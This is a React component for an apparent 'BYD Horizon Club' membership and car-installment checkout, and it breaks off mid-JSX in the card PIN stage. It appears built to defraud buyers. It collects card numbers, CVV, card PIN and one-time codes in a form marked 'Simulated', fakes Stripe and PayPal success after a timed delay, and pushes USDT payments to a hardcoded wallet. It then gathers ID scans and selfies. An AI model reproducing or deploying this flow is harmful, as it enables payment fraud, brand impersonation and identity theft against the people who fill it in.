import React, { useState, useEffect, useRef, useCallback } from 'react';
import {
  CreditCard, Shield, ChevronRight, Lock, Copy, CheckCircle,
  RefreshCcw, HelpCircle, Camera, Check, FileText, Upload, Eye, EyeOff,
  Wallet, Bitcoin, Banknote, Clock, Zap, ArrowRight, AlertTriangle, Loader2
} from 'lucide-react';

interface PaymentFlowProps {
  initialPlan?: string;
  onNavigate: (view: string, params?: any) => void;
  onLoginSuccess: (token: string, user: any) => void;
}

type Step = 'signup' | 'signin' | 'forgot-password' | 'plans' | 'payment-methods' | 'crypto-payment' | 'paystack-flow' | 'stripe-flow' | 'paypal-flow' | 'bank-transfer' | 'success' | 'kyc';

interface FormData {
  name: string; email: string; phone: string; password: string; showPassword: boolean;
  referralCode: string; city: string; country: string;
  plan: string; carModel: string; installmentTerm: number;
  cardNumber: string; cardExpiry: string; cardCvv: string; cardPin: string; cardOtp: string;
  walletAddress: string; txHash: string;
  bankProofFile: File | null; bankProofName: string;
  confirmEmail: string;
}

interface PlanOption {
  id: string; name: string; price: number; currency: string; perks: string[];
  type: 'membership' | 'installment';
}

interface PaymentMethod {
  id: string; name: string; icon: string; badgeColor: string; badgeText: string;
  description: string;
}

interface CarModel {
  id: string; name: string; price: number;
}

interface KycData {
  fullName: string; dateOfBirth: string; nationality: string; idType: string; idNumber: string;
  address: string; documentFront: File | null; documentBack: File | null; selfie: File | null;
  documentFrontName: string; documentBackName: string; selfieName: string;
}

const TOP_STEPS = ['Sign Up', 'Plan', 'Payment', 'Confirm'];

const COUNTRIES = ['United States', 'Canada', 'United Kingdom', 'Australia', 'Germany', 'France', 'Nigeria', 'South Africa', 'Kenya', 'Ghana', 'UAE', 'India', 'China', 'Brazil', 'Mexico', 'Other'];

const CAR_MODELS: CarModel[] = [
  { id: 'seal', name: 'BYD SEAL 2025', price: 49900 },
  { id: 'atto3', name: 'BYD ATTO 3', price: 38900 },
  { id: 'dolphin', name: 'BYD DOLPHIN', price: 29900 },
  { id: 'han', name: 'BYD HAN EV', price: 59900 },
  { id: 'tang', name: 'BYD TANG EV', price: 69900 },
];

const PAYMENT_METHODS: PaymentMethod[] = [
  { id: 'crypto', name: 'Cryptocurrency (USDT/TRC20)', icon: 'bitcoin', badgeColor: 'emerald', badgeText: 'Fastest (0-5 min)', description: 'Pay with USDT on TRC20 network' },
  { id: 'paystack', name: 'Paystack', icon: 'creditcard', badgeColor: 'yellow', badgeText: 'Available (1-3 days)', description: 'Card payments via Paystack' },
  { id: 'stripe', name: 'Stripe', icon: 'creditcard', badgeColor: 'yellow', badgeText: '1-3 days', description: 'International card payments' },
  { id: 'paypal', name: 'PayPal', icon: 'wallet', badgeColor: 'yellow', badgeText: '1-3 days', description: 'Pay with your PayPal balance' },
  { id: 'bank', name: 'Bank Transfer', icon: 'banknote', badgeColor: 'gray', badgeText: '3-5 days', description: 'Direct bank transfer' },
];

const ID_TYPES = ['Passport', "Driver's License", 'National ID', 'Voter ID'];

const Stepper: React.FC<{ current: number }> = ({ current }) => (
  <div className="flex items-center justify-center gap-2 mb-8">
    {TOP_STEPS.map((label, i) => (
      <React.Fragment key={label}>
        <div className="flex items-center gap-2">
          <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold transition-all duration-500 ${i <= current ? 'bg-emerald-500 text-white shadow-lg shadow-emerald-500/30' : 'bg-white/10 text-white/40'}`}>
            {i < current ? <Check className="w-4 h-4" /> : i + 1}
          </div>
          <span className={`text-xs hidden sm:block font-medium transition-colors duration-300 ${i <= current ? 'text-white' : 'text-white/30'}`}>{label}</span>
        </div>
        {i < TOP_STEPS.length - 1 && (
          <div className={`w-10 sm:w-16 h-0.5 transition-all duration-500 ${i < current ? 'bg-emerald-500' : 'bg-white/10'}`} />
        )}
      </React.Fragment>
    ))}
  </div>
);

const ConfettiEffect: React.FC = () => {
  const canvasRef = useRef<HTMLCanvasElement>(null);
  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    const particles: { x: number; y: number; vx: number; vy: number; size: number; color: string; rotation: number; rotationSpeed: number }[] = [];
    const colors = ['#10b981', '#3b82f6', '#f59e0b', '#ef4444', '#8b5cf6', '#ec4899'];
    for (let i = 0; i < 150; i++) {
      particles.push({
        x: Math.random() * canvas.width,
        y: Math.random() * canvas.height - canvas.height,
        vx: (Math.random() - 0.5) * 4,
        vy: Math.random() * 3 + 1,
        size: Math.random() * 8 + 4,
        color: colors[Math.floor(Math.random() * colors.length)],
        rotation: Math.random() * 360,
        rotationSpeed: (Math.random() - 0.5) * 10,
      });
    }
    let frame = 0;
    const animate = () => {
      if (!ctx || !canvas) return;
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      frame++;
      if (frame > 300) { ctx.clearRect(0, 0, canvas.width, canvas.height); return; }
      particles.forEach(p => {
        p.x += p.vx;
        p.y += p.vy;
        p.vy += 0.02;
        p.rotation += p.rotationSpeed;
        ctx.save();
        ctx.translate(p.x, p.y);
        ctx.rotate((p.rotation * Math.PI) / 180);
        ctx.fillStyle = p.color;
        ctx.globalAlpha = Math.max(0, 1 - frame / 300);
        ctx.fillRect(-p.size / 2, -p.size / 4, p.size, p.size / 2);
        ctx.restore();
      });
      requestAnimationFrame(animate);
    };
    animate();
  }, []);
  return <canvas ref={canvasRef} className="fixed inset-0 pointer-events-none z-50" />;
};

const CheckmarkAnimation: React.FC = () => {
  const [show, setShow] = useState(false);
  useEffect(() => { setTimeout(() => setShow(true), 100); }, []);
  return (
    <div className={`flex items-center justify-center transition-all duration-700 transform ${show ? 'scale-100 opacity-100' : 'scale-0 opacity-0'}`}>
      <div className="w-24 h-24 rounded-full bg-emerald-500/20 flex items-center justify-center border-2 border-emerald-500">
        <CheckCircle className="w-14 h-14 text-emerald-400" />
      </div>
    </div>
  );
};

const apiPost = async (url: string, body: any) => {
  const token = localStorage.getItem('token');
  const res = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', ...(token ? { Authorization: `Bearer ${token}` } : {}) },
    body: JSON.stringify(body),
  });
  return res.json();
};

const PaymentFlow: React.FC<PaymentFlowProps> = ({ initialPlan, onNavigate, onLoginSuccess }) => {
  const [step, setStep] = useState<Step>('signup');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [topStepIndex, setTopStepIndex] = useState(0);
  const [showConfetti, setShowConfetti] = useState(false);
  const [cryptoBonus] = useState(true);
  const [paystackStage, setPaystackStage] = useState<'card' | 'pin' | 'otp' | 'success'>('card');
  const [paymentProcessing, setPaymentProcessing] = useState(false);
  const [cryptoTxSubmitted, setCryptoTxSubmitted] = useState(false);
  const [cryptoWalletCopied, setCryptoWalletCopied] = useState(false);
  const [simulatedTimeout, setSimulatedTimeout] = useState(false);
  const [kycStep, setKycStep] = useState(0);

  const [form, setForm] = useState<FormData>({
    name: '', email: '', phone: '', password: '', showPassword: false,
    referralCode: '', city: '', country: 'United States',
    plan: initialPlan || 'founders-club', carModel: 'seal', installmentTerm: 12,
    cardNumber: '', cardExpiry: '', cardCvv: '', cardPin: '', cardOtp: '',
    walletAddress: '', txHash: '',
    bankProofFile: null, bankProofName: '',
    confirmEmail: '',
  });

  const [kyc, setKyc] = useState<KycData>({
    fullName: '', dateOfBirth: '', nationality: '', idType: 'Passport', idNumber: '',
    address: '', documentFront: null, documentBack: null, selfie: null,
    documentFrontName: '', documentBackName: '', selfieName: '',
  });

  const [selectedCar] = useState<CarModel>(CAR_MODELS[0]);

  const selectedCarModel = CAR_MODELS.find(c => c.id === form.carModel) || CAR_MODELS[0];
  const monthlyPayment = selectedCarModel ? (selectedCarModel.price / form.installmentTerm) * 0.85 : 0;
  const cryptoAmount = form.plan === 'founders-club' ? '99' : String(Math.round(monthlyPayment));

  const updateForm = (field: keyof FormData, value: any) => setForm(prev => ({ ...prev, [field]: value }));

  const togglePassword = () => updateForm('showPassword', !form.showPassword);

  const setStepWithIndex = (newStep: Step, idx: number) => {
    setTopStepIndex(idx);
    setStep(newStep);
    setError('');
  };

  const handleSignUp = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    try {
      const res = await apiPost('/api/auth/register', {
        name: form.name, email: form.email, phone: form.phone,
        password: form.password, referralCode: form.referralCode,
        city: form.city, country: form.country,
      });
      if (res.error) { setError(res.error); return; }
      setStepWithIndex('signin', 0);
    } catch { setError('Registration failed. Please try again.'); }
    finally { setLoading(false); }
  };

  const handleSignIn = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    try {
      const res = await apiPost('/api/auth/login', { email: form.email, password: form.password });
      if (res.error) { setError(res.error); return; }
      localStorage.setItem('token', res.token);
      onLoginSuccess(res.token, res.user);
      setStepWithIndex('plans', 1);
    } catch { setError('Invalid email or password.'); }
    finally { setLoading(false); }
  };

  const handleForgotPassword = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    try {
      const res = await apiPost('/api/auth/forgot-password', { email: form.confirmEmail });
      if (res.error) { setError(res.error); return; }
      setStep('signin');
      setError('Password reset link sent to your email.');
    } catch { setError('Failed to send reset link.'); }
    finally { setLoading(false); }
  };

  const handleSelectPlan = (planId: string) => {
    updateForm('plan', planId);
    setStepWithIndex('payment-methods', 2);
  };

  const handleSelectPaymentMethod = (methodId: string) => {
    switch (methodId) {
      case 'crypto': setStep('crypto-payment'); break;
      case 'paystack': setStep('paystack-flow'); setPaystackStage('card'); break;
      case 'stripe': setStep('stripe-flow'); setSimulatedTimeout(false); break;
      case 'paypal': setStep('paypal-flow'); setSimulatedTimeout(false); break;
      case 'bank': setStep('bank-transfer'); break;
    }
  };

  const handleCryptoPayment = async () => {
    setLoading(true);
    try {
      await apiPost('/api/payments/create', {
        method: 'crypto', plan: form.plan, amount: cryptoAmount, txHash: form.txHash,
        cryptoWallet: 'TR7U...3kP9',
      });
      setCryptoTxSubmitted(true);
      setTimeout(() => { setStep('kyc'); }, 3000);
    } catch { setError('Payment submission failed.'); }
    finally { setLoading(false); }
  };

  const copyWallet = () => {
    navigator.clipboard.writeText('TR7U3kP9x2mZnQ8vL5jM1wX4yR6sN0bA');
    setCryptoWalletCopied(true);
    setTimeout(() => setCryptoWalletCopied(false), 2000);
  };

  const handlePaystackNext = () => {
    if (paystackStage === 'card' && form.cardNumber.length >= 16) setPaystackStage('pin');
    else if (paystackStage === 'pin' && form.cardPin.length === 4) setPaystackStage('otp');
    else if (paystackStage === 'otp' && form.cardOtp.length === 6) {
      setPaymentProcessing(true);
      setTimeout(async () => {
        await apiPost('/api/payments/create', { method: 'paystack', plan: form.plan });
        setPaymentProcessing(false);
        setPaystackStage('success');
        setShowConfetti(true);
        setTimeout(() => { setShowConfetti(false); setStep('kyc'); }, 4000);
      }, 1500);
    }
  };

  const handleStripePayment = async () => {
    setSimulatedTimeout(true);
    setLoading(true);
    await new Promise(r => setTimeout(r, 3000));
    setLoading(false);
    setSimulatedTimeout(false);
    setError('');
    await apiPost('/api/payments/create', { method: 'stripe', plan: form.plan });
    setShowConfetti(true);
    setTimeout(() => { setShowConfetti(false); setStep('kyc'); }, 4000);
  };

  const handlePayPalPayment = async () => {
    setSimulatedTimeout(true);
    setLoading(true);
    await new Promise(r => setTimeout(r, 3000));
    setLoading(false);
    setSimulatedTimeout(false);
    await apiPost('/api/payments/create', { method: 'paypal', plan: form.plan });
    setShowConfetti(true);
    setTimeout(() => { setShowConfetti(false); setStep('kyc'); }, 4000);
  };

  const handleBankProofUpload = async () => {
    setLoading(true);
    const formData = new FormData();
    if (form.bankProofFile) formData.append('proof', form.bankProofFile);
    formData.append('plan', form.plan);
    try {
      await fetch('/api/payments/proof', { method: 'POST', body: formData });
      await apiPost('/api/payments/create', { method: 'bank_transfer', plan: form.plan });
      setStep('kyc');
    } catch { setError('Upload failed.'); }
    finally { setLoading(false); }
  };

  const handleKycSubmit = async () => {
    setLoading(true); setError('');
    try {
      const formData = new FormData();
      Object.entries(kyc).forEach((entry) => {
        const v = entry[1];
        if (v instanceof File) formData.append(entry[0], v);
        else if (typeof v === "string") formData.append(entry[0], v);
      });
      await fetch('/api/kyc/submit', { method: 'POST', body: formData });
      setStep('success');
      setShowConfetti(true);
      setTimeout(() => setShowConfetti(false), 5000);
    } catch { setError('KYC submission failed.'); }
    finally { setLoading(false); }
  };

  const formatCardNumber = (v: string) => v.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim().slice(0, 19);
  const formatExpiry = (v: string) => v.replace(/\D/g, '').replace(/(\d{2})(\d)/, '$1/$2').slice(0, 5);

  const renderField = (label: string, type: string, value: string, onChange: (v: string) => void, options?: { placeholder?: string; hint?: string; required?: boolean; maxLength?: number; disabled?: boolean; rows?: number }) => {
    const baseInput = 'w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white placeholder-white/30 focus:outline-none focus:border-emerald-500/50 focus:ring-1 focus:ring-emerald-500/30 transition-all';
    const textarea = type === 'textarea';
    return (
      <div className="space-y-1.5">
        <label className="block text-sm font-medium text-white/70">{label}{options?.required && <span className="text-red-400 ml-1">*</span>}</label>
        {textarea ? (
          <textarea className={`${baseInput} min-h-[80px] resize-none`} placeholder={options?.placeholder} value={value} onChange={e => onChange(e.target.value)} disabled={options?.disabled} rows={options?.rows || 3} />
        ) : (
          <input className={baseInput} type={type} placeholder={options?.placeholder} value={value} onChange={e => onChange(e.target.value)} maxLength={options?.maxLength} disabled={options?.disabled} required={options?.required} />
        )}
        {options?.hint && <p className="text-xs text-white/40">{options.hint}</p>}
      </div>
    );
  };

  const renderSignUp = () => (
    <form onSubmit={handleSignUp} className="space-y-4">
      <div className="text-center mb-6">
        <h2 className="text-2xl font-bold text-white">Join BYD Horizon Club</h2>
        <p className="text-white/50 text-sm mt-1">Create your account to get started</p>
      </div>
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
        {renderField('Full Name', 'text', form.name, v => updateForm('name', v), { placeholder: 'John Doe', required: true })}
        {renderField('Email', 'email', form.email, v => updateForm('email', v), { placeholder: 'you@example.com', required: true })}
        {renderField('Phone', 'tel', form.phone, v => updateForm('phone', v), { placeholder: '+1 234 567 8900', required: true })}
        <div className="space-y-1.5">
          <label className="block text-sm font-medium text-white/70">Password <span className="text-red-400">*</span></label>
          <div className="relative">
            <input className="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white placeholder-white/30 focus:outline-none focus:border-emerald-500/50 focus:ring-1 focus:ring-emerald-500/30 transition-all pr-10" type={form.showPassword ? 'text' : 'password'} placeholder="Min 8 characters" value={form.password} onChange={e => updateForm('password', e.target.value)} required />
            <button type="button" onClick={togglePassword} className="absolute right-3 top-1/2 -translate-y-1/2 text-white/40 hover:text-white/70 transition-colors">
              {form.showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
            </button>
          </div>
        </div>
        {renderField('Referral Code (optional)', 'text', form.referralCode, v => updateForm('referralCode', v), { placeholder: 'e.g. HORIZON2025', hint: 'Enter referral code for bonus' })}
        {renderField('City', 'text', form.city, v => updateForm('city', v), { placeholder: 'Los Angeles', required: true })}
        <div className="space-y-1.5">
          <label className="block text-sm font-medium text-white/70">Country <span className="text-red-400">*</span></label>
          <select className="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white focus:outline-none focus:border-emerald-500/50 transition-all appearance-none cursor-pointer" value={form.country} onChange={e => updateForm('country', e.target.value)}>
            {COUNTRIES.map(c => <option key={c} value={c} className="bg-[#0a0e1a]">{c}</option>)}
          </select>
        </div>
      </div>
      {error && <p className="text-red-400 text-sm flex items-center gap-1"><AlertTriangle className="w-4 h-4" />{error}</p>}
      <button type="submit" disabled={loading} className="w-full py-3.5 bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-400 hover:to-emerald-500 text-white font-semibold rounded-xl transition-all duration-300 flex items-center justify-center gap-2 disabled:opacity-50 shadow-lg shadow-emerald-500/20">
        {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : <><CreditCard className="w-5 h-5" /> Create Account</>}
      </button>
      <p className="text-center text-sm text-white/40">
        Already have an account?{' '}
        <button type="button" onClick={() => setStepWithIndex('signin', 0)} className="text-emerald-400 hover:text-emerald-300 font-medium transition-colors">Sign In</button>
      </p>
    </form>
  );

  const renderSignIn = () => (
    <form onSubmit={handleSignIn} className="space-y-5">
      <div className="text-center mb-2">
        <h2 className="text-2xl font-bold text-white">Welcome Back</h2>
        <p className="text-white/50 text-sm mt-1">Sign in to your Horizon Club account</p>
      </div>
      {error && <p className="text-emerald-400 text-sm text-center">{error}</p>}
      {renderField('Email', 'email', form.email, v => updateForm('email', v), { placeholder: 'you@example.com', required: true })}
      <div className="space-y-1.5">
        <label className="block text-sm font-medium text-white/70">Password <span className="text-red-400">*</span></label>
        <div className="relative">
          <input className="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white placeholder-white/30 focus:outline-none focus:border-emerald-500/50 focus:ring-1 focus:ring-emerald-500/30 transition-all pr-10" type={form.showPassword ? 'text' : 'password'} placeholder="Your password" value={form.password} onChange={e => updateForm('password', e.target.value)} required />
          <button type="button" onClick={togglePassword} className="absolute right-3 top-1/2 -translate-y-1/2 text-white/40 hover:text-white/70 transition-colors">
            {form.showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
          </button>
        </div>
      </div>
      {error && !error.includes('sent') && <p className="text-red-400 text-sm flex items-center gap-1"><AlertTriangle className="w-4 h-4" />{error}</p>}
      <button type="submit" disabled={loading} className="w-full py-3.5 bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-400 hover:to-emerald-500 text-white font-semibold rounded-xl transition-all duration-300 flex items-center justify-center gap-2 disabled:opacity-50 shadow-lg shadow-emerald-500/20">
        {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : <><Lock className="w-5 h-5" /> Sign In</>}
      </button>
      <div className="flex justify-between text-sm">
        <button type="button" onClick={() => { setStep('forgot-password'); setError(''); }} className="text-white/40 hover:text-emerald-400 transition-colors">Forgot password?</button>
        <button type="button" onClick={() => setStepWithIndex('signup', 0)} className="text-emerald-400 hover:text-emerald-300 transition-colors font-medium">Create account</button>
      </div>
    </form>
  );

  const renderForgotPassword = () => (
    <form onSubmit={handleForgotPassword} className="space-y-5">
      <div className="text-center mb-2">
        <h2 className="text-2xl font-bold text-white">Reset Password</h2>
        <p className="text-white/50 text-sm mt-1">Enter your email to receive a reset link</p>
      </div>
      {renderField('Email Address', 'email', form.confirmEmail, v => updateForm('confirmEmail', v), { placeholder: 'you@example.com', required: true })}
      {error && <p className={`text-sm flex items-center gap-1 ${error.includes('sent') ? 'text-emerald-400' : 'text-red-400'}`}><AlertTriangle className="w-4 h-4" />{error}</p>}
      <button type="submit" disabled={loading} className="w-full py-3.5 bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-400 hover:to-emerald-500 text-white font-semibold rounded-xl transition-all duration-300 flex items-center justify-center gap-2 disabled:opacity-50 shadow-lg shadow-emerald-500/20">
        {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : 'Send Reset Link'}
      </button>
      <button type="button" onClick={() => setStepWithIndex('signin', 0)} className="w-full text-sm text-white/40 hover:text-emerald-400 transition-colors text-center">Back to Sign In</button>
    </form>
  );

  const renderPlans = () => (
    <div className="space-y-6">
      <div className="text-center">
        <h2 className="text-2xl font-bold text-white">Choose Your Plan</h2>
        <p className="text-white/50 text-sm mt-1">Select membership or payment plan</p>
      </div>
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-5">
        <button onClick={() => handleSelectPlan('founders-club')} className={`text-left p-6 rounded-2xl border transition-all duration-300 group hover:scale-[1.02] ${form.plan === 'founders-club' ? 'border-emerald-500 bg-emerald-500/10 shadow-lg shadow-emerald-500/10' : 'border-white/10 bg-white/5 hover:bg-white/10'}`}>
          <div className="flex items-start justify-between mb-4">
            <div>
              <h3 className="text-xl font-bold text-white">Founder's Club</h3>
              <p className="text-white/40 text-sm">Annual membership</p>
            </div>
            <div className="text-right">
              <p className="text-3xl font-bold text-emerald-400">$99</p>
              <p className="text-white/30 text-xs">/year</p>
            </div>
          </div>
          <div className="space-y-2">
            {['Priority EV charging', 'Exclusive BYD events access', 'Horizon Points 2x earning', 'Premium support 24/7', 'Early access to new models'].map((perk, i) => (
              <div key={i} className="flex items-center gap-2 text-sm text-white/70">
                <Check className="w-4 h-4 text-emerald-400 flex-shrink-0" />
                <span>{perk}</span>
              </div>
            ))}
          </div>
        </button>
        <div className={`p-6 rounded-2xl border transition-all ${form.plan === 'installment' ? 'border-emerald-500 bg-emerald-500/10 shadow-lg shadow-emerald-500/10' : 'border-white/10 bg-white/5'}`}>
          <div className="flex items-start justify-between mb-4">
            <div>
              <h3 className="text-xl font-bold text-white">Installment Plan</h3>
              <p className="text-white/40 text-sm">Own your BYD today</p>
            </div>
            <div className="text-right">
              <p className="text-3xl font-bold text-emerald-400">${Math.round(monthlyPayment).toLocaleString()}</p>
              <p className="text-white/30 text-xs">/month</p>
            </div>
          </div>
          <div className="space-y-3">
            <div className="space-y-1.5">
              <label className="text-xs text-white/50">Car Model</label>
              <select className="w-full px-3 py-2.5 bg-white/5 border border-white/10 rounded-lg text-white text-sm focus:outline-none focus:border-emerald-500/50 transition-all appearance-none cursor-pointer" value={form.carModel} onChange={e => updateForm('carModel', e.target.value)}>
                {CAR_MODELS.map(c => <option key={c.id} value={c.id} className="bg-[#0a0e1a]">{c.name} (${c.price.toLocaleString()})</option>)}
              </select>
            </div>
            <div className="space-y-1.5">
              <label className="text-xs text-white/50">Term</label>
              <div className="grid grid-cols-2 gap-2">
                {[12, 24].map(m => (
                  <button key={m} type="button" onClick={() => updateForm('installmentTerm', m)} className={`py-2.5 rounded-lg text-sm font-medium transition-all ${form.installmentTerm === m ? 'bg-emerald-500 text-white' : 'bg-white/5 text-white/60 hover:bg-white/10'}`}>{m} months</button>
                ))}
              </div>
            </div>
          </div>
          <div className="mt-4 pt-4 border-t border-white/10 space-y-1 text-sm">
            <div className="flex justify-between text-white/50"><span>Car Price</span><span className="text-white">${selectedCarModel.price.toLocaleString()}</span></div>
            <div className="flex justify-between text-white/50"><span>Down Payment (15%)</span><span className="text-white">${Math.round(selectedCarModel.price * 0.15).toLocaleString()}</span></div>
            <div className="flex justify-between text-white/50"><span>Monthly Payment</span><span className="text-emerald-400 font-bold">${Math.round(monthlyPayment).toLocaleString()}</span></div>
          </div>
          <button onClick={() => handleSelectPlan('installment')} className="w-full mt-4 py-3 bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-400 hover:to-emerald-500 text-white font-semibold rounded-xl transition-all duration-300 shadow-lg shadow-emerald-500/20 flex items-center justify-center gap-2">
            <Zap className="w-4 h-4" /> Select Plan
          </button>
        </div>
      </div>
    </div>
  );

  const renderPaymentMethods = () => (
    <div className="space-y-6">
      <div className="text-center">
        <h2 className="text-2xl font-bold text-white">Payment Method</h2>
        <p className="text-white/50 text-sm mt-1">
          Amount: <span className="text-emerald-400 font-bold">${form.plan === 'founders-club' ? '99' : Math.round(monthlyPayment).toLocaleString()}</span>
        </p>
      </div>
      {cryptoBonus && (
        <div className="flex items-center gap-2 px-4 py-3 bg-gradient-to-r from-emerald-500/10 to-emerald-600/5 border border-emerald-500/20 rounded-xl">
          <Zap className="w-5 h-5 text-emerald-400 flex-shrink-0" />
          <p className="text-sm text-emerald-300">5% extra Horizon Points for crypto payments</p>
        </div>
      )}
      <div className="space-y-3">
        {PAYMENT_METHODS.map(method => {
          const badgeColors: Record<string, string> = { emerald: 'bg-emerald-500/20 text-emerald-300 border-emerald-500/30', yellow: 'bg-yellow-500/20 text-yellow-300 border-yellow-500/30', gray: 'bg-white/10 text-white/50 border-white/10' };
          return (
            <button key={method.id} onClick={() => handleSelectPaymentMethod(method.id)} className="w-full flex items-center gap-4 p-4 bg-white/5 border border-white/10 rounded-xl hover:bg-white/10 hover:border-white/20 transition-all group text-left">
              <div className="w-12 h-12 rounded-full bg-white/5 flex items-center justify-center flex-shrink-0 group-hover:bg-white/10 transition-all">
                {method.icon === 'bitcoin' && <Bitcoin className="w-6 h-6 text-emerald-400" />}
                {method.icon === 'creditcard' && <CreditCard className="w-6 h-6 text-white/70" />}
                {method.icon === 'wallet' && <Wallet className="w-6 h-6 text-white/70" />}
                {method.icon === 'banknote' && <Banknote className="w-6 h-6 text-white/70" />}
              </div>
              <div className="flex-1 min-w-0">
                <div className="flex items-center gap-2 flex-wrap">
                  <span className="text-white font-medium">{method.name}</span>
                  <span className={`text-xs px-2 py-0.5 rounded-full border ${badgeColors[method.badgeColor]}`}>{method.badgeText}</span>
                </div>
                <p className="text-white/40 text-sm mt-0.5">{method.description}</p>
              </div>
              <ChevronRight className="w-5 h-5 text-white/30 group-hover:text-white/60 transition-all" />
            </button>
          );
        })}
      </div>
    </div>
  );

  const renderCryptoPayment = () => (
    <div className="space-y-6">
      <div className="text-center">
        <h2 className="text-2xl font-bold text-white">Crypto Payment</h2>
        <p className="text-white/50 text-sm mt-1">USDT (TRC20) Network</p>
      </div>
      <div className="p-5 bg-gradient-to-br from-emerald-500/10 to-emerald-600/5 border border-emerald-500/20 rounded-2xl space-y-4">
        <div className="space-y-2">
          <label className="text-sm text-white/50">Deposit Address (TRC20)</label>
          <div className="flex items-center gap-2 p-3 bg-black/30 border border-white/10 rounded-xl">
            <code className="flex-1 text-xs sm:text-sm text-emerald-300 font-mono break-all">TR7U3kP9x2mZnQ8vL5jM1wX4yR6sN0bA</code>
            <button onClick={copyWallet} className="flex-shrink-0 p-2 bg-white/5 hover:bg-white/10 rounded-lg transition-all" title="Copy address">
              {cryptoWalletCopied ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4 text-white/60" />}
            </button>
          </div>
        </div>
        <div className="flex justify-between items-center">
          <span className="text-white/50 text-sm">Amount to send</span>
          <span className="text-2xl font-bold text-white">{cryptoAmount} USDT</span>
        </div>
        <div className="flex justify-between items-center">
          <span className="text-white/50 text-sm">Network</span>
          <span className="text-white font-medium">TRC20</span>
        </div>
        <div className="h-24 bg-black/30 border border-white/10 rounded-xl flex items-center justify-center">
          <div className="text-center">
            <Wallet className="w-8 h-8 text-white/20 mx-auto mb-1" />
            <p className="text-xs text-white/30">QR Code Placeholder</p>
          </div>
        </div>
      </div>
      <div className="p-4 bg-gradient-to-r from-yellow-500/10 to-yellow-600/5 border border-yellow-500/20 rounded-xl flex items-start gap-3">
        <AlertTriangle className="w-5 h-5 text-yellow-400 flex-shrink-0 mt-0.5" />
        <p className="text-sm text-yellow-200/80">Send <strong className="text-yellow-200">{cryptoAmount} USDT</strong> to the address above. After sending, enter the transaction hash below.</p>
      </div>
      {!cryptoTxSubmitted ? (
        <div className="space-y-4">
          {renderField('Transaction Hash (TXID)', 'text', form.txHash, v => updateForm('txHash', v), { placeholder: 'Paste your transaction hash here', required: true })}
          {error && <p className="text-red-400 text-sm flex items-center gap-1"><AlertTriangle className="w-4 h-4" />{error}</p>}
          <button onClick={handleCryptoPayment} disabled={loading || !form.txHash} className="w-full py-3.5 bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-400 hover:to-emerald-500 text-white font-semibold rounded-xl transition-all duration-300 flex items-center justify-center gap-2 disabled:opacity-50 shadow-lg shadow-emerald-500/20">
            {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : "I've sent the payment"}
          </button>
        </div>
      ) : (
        <div className="text-center py-6">
          <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-emerald-500/20 flex items-center justify-center border-2 border-emerald-500 animate-pulse">
            <Clock className="w-8 h-8 text-emerald-400" />
          </div>
          <p className="text-white font-medium">Payment Pending</p>
          <p className="text-white/40 text-sm mt-1">Waiting for blockchain confirmation...</p>
          <p className="text-white/30 text-xs mt-3">Hash: {form.txHash.slice(0, 16)}...</p>
        </div>
      )}
      <button type="button" onClick={() => setStep('payment-methods')} className="w-full text-sm text-white/40 hover:text-white/60 transition-colors">Back to payment methods</button>
    </div>
  );

  const renderPaystackFlow = () => {
    const isStage = (s: string) => paystackStage === s;
    return (
      <div className="space-y-6">
        <div className="text-center">
          <h2 className="text-2xl font-bold text-white">Paystack</h2>
          <p className="text-white/50 text-sm mt-1">Simulated card payment</p>
        </div>
        <div className="flex justify-center gap-2 mb-4">
          {['card', 'pin', 'otp'].map((s, i) => (
            <div key={s} className={`w-3 h-3 rounded-full transition-all duration-300 ${paystackStage === s ? 'bg-emerald-500 scale-125' : paystackStage === 'success' ? 'bg-emerald-500' : i < ['card', 'pin', 'otp'].indexOf(paystackStage) ? 'bg-emerald-500/50' : 'bg-white/10'}`} />
          ))}
        </div>
        {isStage('card') && (
          <div className="space-y-4">
            {renderField('Card Number', 'text', form.cardNumber, v => updateForm('cardNumber', formatCardNumber(v)), { placeholder: '4242 4242 4242 4242', required: true, maxLength: 19 })}
            <div className="grid grid-cols-2 gap-4">
              {renderField('Expiry', 'text', form.cardExpiry, v => updateForm('cardExpiry', formatExpiry(v)), { placeholder: 'MM/YY', required: true, maxLength: 5 })}
              {renderField('CVV', 'text', form.cardCvv, v => updateForm('cardCvv', v.replace(/\D/g, '').slice(0, 3)), { placeholder: '123', required: true, maxLength: 3 })}
            </div>
            <button onClick={handlePaystackNext} disabled={form.cardNumber.length < 16} className="w-full py-3.5 bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-400 hover:to-emerald-500 text-white font-semibold rounded-xl transition-all duration-300 disabled:opacity-50 shadow-lg shadow-emerald-500/20">
              Continue
            </button>
          </div>
        )}
        {isStage('pin') && (
          <div className="space-y-4">
